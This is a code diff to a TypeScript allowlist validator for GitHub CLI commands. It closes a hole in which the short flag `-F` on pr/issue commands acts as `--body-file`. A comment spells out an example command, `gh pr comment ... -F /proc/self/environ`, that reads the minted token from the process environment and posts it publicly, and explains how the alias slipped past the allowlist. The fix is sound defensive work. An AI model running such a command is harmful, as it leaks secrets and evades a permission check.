@@ -415,6 +415,21 @@ function isCredentialSafeGhCommand(command: string): boolean {
   return tokens[0] === 'gh' && isCredentialSafeGhArgs(tokens.slice(1))
 }
 
+// Flag NAMES are scoped by Cobra command, so a name-only allowlist is not a
+// flag allowlist. `-F` is `--field` for `gh api`/`gh workflow run`, but Cobra
+// binds it to `--body-file` on every pr/issue command in SAFE_GH_OPERATIONS:
+// `gh pr comment 1 -R o/r -F /proc/self/environ` reads the minted token out of
+// gh's own environ and posts it to a public comment thread. The long `--body-file`
+// was denied while its short alias walked straight through the same allowlist.
+// `-f` keeps its `gh label create/clone` `--force` meaning — the same command
+// scoping `ghFlagTakesValue` already applies when finding positionals.
+const API_FIELD_FLAGS = new Set(['-f', '--raw-field', '-F', '--field'])
+
+function acceptsApiFieldFlag(command: string, flag: string): boolean {
+  if (command === 'api' || command === 'workflow') return true
+  return flag === '-f' && command === 'label'
+}
+
 function isCredentialSafeGhArgs(args: readonly string[]): boolean {
   const parsed = parseGhArgs(args)
   if (parsed === null) return false
@@ -434,10 +449,8 @@ function isCredentialSafeGhArgs(args: readonly string[]): boolean {
     if (CREDENTIAL_UNSAFE_FLAGS.has(flag)) return false
     if (flag.endsWith('-file') || flag.endsWith('-file-name')) return false
     if (arg.startsWith('-') && !CREDENTIAL_SAFE_FLAGS.has(flag)) return false
-    if (
-      (command === 'api' || command === 'workflow') &&
-      (flag === '--raw-field' || flag === '-f' || flag === '--field' || flag === '-F')
-    ) {
+    if (API_FIELD_FLAGS.has(flag) && !acceptsApiFieldFlag(command, flag)) return false
+    if ((command === 'api' || command === 'workflow') && API_FIELD_FLAGS.has(flag)) {
       const value = flagValue(args, i)
       if (value === null || fieldDereferencesFile(value)) return false
     }
